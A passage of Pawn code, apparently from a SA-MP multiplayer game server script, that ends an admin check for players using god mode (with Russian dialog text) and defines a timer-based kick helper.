        SetHealth(AdmGMID[playerid], AdmGMHP[AdmGMID[playerid]]);
        SetHealth(AdmGMID[playerid], AdmGMHP[AdmGMID[playerid]]);
        AdmGM[AdmGMID[playerid]] = 0;
        AdmGMHP[AdmGMID[playerid]] = 0;
        AdmGMID[playerid] = INVALID_PLAYER_ID;}
     else if((AdmGMHP[AdmGMID[playerid]]-nowhealth[AdmGMID[playerid]]) == 0){
        format(string, sizeof(string), "До: \t\t\t%.0f.0 HP\nПосле: \t\t\t%.0f.0 HP\nHP не уменьшилось\n\n{CD5A5A}Возможно этот игрок использует ГМ.",AdmGMHP[AdmGMID[playerid]],nowhealth[AdmGMID[playerid]]);
        ShowPlayerDialog(playerid,888,DIALOG_STYLE_MSGBOX  , "Проверка God Mode",string, "Закрыть", "");
        AdmGM[AdmGMID[playerid]] = 0;
        AdmGMArm[playerid] = 0;
        AdmGMHP[AdmGMID[playerid]] = 0;
        AdmGMID[playerid] = INVALID_PLAYER_ID;}
    KillTimer(GmtestTimer[playerid]);}
public KickTimer(playerid) return GKick(playerid);
stock GKick(playerid, time = 5000){
    if(GetPVarInt(playerid, "Kick") == -1) Kick(playerid);
    else if(!GetPVarInt(playerid, "Kick")) SetPVarInt(playerid, "Kick", SetTimerEx("KickTimer", time, 0, "d", playerid));
    else{
        KillTimer(GetPVarInt(playerid, "Kick"));
        SetPVarInt(playerid, "Kick", -1);
        GKick(playerid);}
    return 1;}
